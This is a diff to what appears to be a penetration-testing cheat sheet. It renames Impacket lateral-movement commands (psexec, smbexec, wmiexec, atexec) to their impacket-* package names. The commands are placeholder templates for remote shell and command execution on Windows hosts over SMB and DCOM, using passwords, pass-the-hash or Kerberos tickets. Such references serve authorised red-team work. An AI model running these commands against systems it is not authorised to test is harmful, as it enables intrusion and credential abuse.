@@ -7,7 +7,7 @@
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-psexec.py <domain>/<user>:<password>@<ip>
+impacket-psexec <domain>/<user>:<password>@<ip>
 ```
 
 ## PSEXEC with pass the Hash (pth)
@@ -15,7 +15,7 @@ psexec.py <domain>/<user>:<password>@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-psexec.py -hashes <hash> <user>@<ip>
+impacket-psexec -hashes <hash> <user>@<ip>
 ```
 
 ## PSEXEC with kerberos
@@ -23,28 +23,28 @@ psexec.py -hashes <hash> <user>@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
+export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
 ```
 
 ## SMBEXEC with username
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service 'BTOBTO' (using temp bat files via SMB)
 ```
-smbexec.py <domain>/<user>:<password>@<ip>
+impacket-smbexec <domain>/<user>:<password>@<ip>
 ```
 
 ## SMBEXEC with pass the Hash (pth)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service 'BTOBTO' (using temp bat files via SMB)
 ```
-smbexec.py -hashes <hash> <user>@<ip>
+impacket-smbexec -hashes <hash> <user>@<ip>
 ```
 
 ## SMBEXEC with kerberos
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service 'BTOBTO' (using temp bat files via SMB)
 ```
-export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
+export KRB5CCNAME=<ccache_file>; impacket-smbexec -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
 ```
 
 ## wmiexec
@@ -52,7 +52,7 @@ export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py <domain>/<user>:<password>@<ip>
+impacket-wmiexec <domain>/<user>:<password>@<ip>
 ```
 
 ## wmiexec  with pass the hash (pth) 
@@ -61,7 +61,7 @@ wmiexec.py <domain>/<user>:<password>@<ip>
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py -hashes <hash> <user>@<ip>
+impacket-wmiexec -hashes <hash> <user>@<ip>
 ```
 
 ## atexec - execute command view the task scheduler 
@@ -69,7 +69,7 @@ wmiexec.py -hashes <hash> <user>@<ip>
 Using \pipe\atsvc via SMB
 
 ```
-atexec.py <domain>/<user>:<password>@<ip> "command"
+impacket-atexec <domain>/<user>:<password>@<ip> "command"
 ```
 
 ## atexec pass the hash (pth)
@@ -77,5 +77,5 @@ atexec.py <domain>/<user>:<password>@<ip> "command"
 Execute command view the task scheduler (using \pipe\atsvc via SMB)
 
 ```
-atexec.py -hashes <hash> <user>@<ip> "command"
+impacket-atexec -hashes <hash> <user>@<ip> "command"
 ```
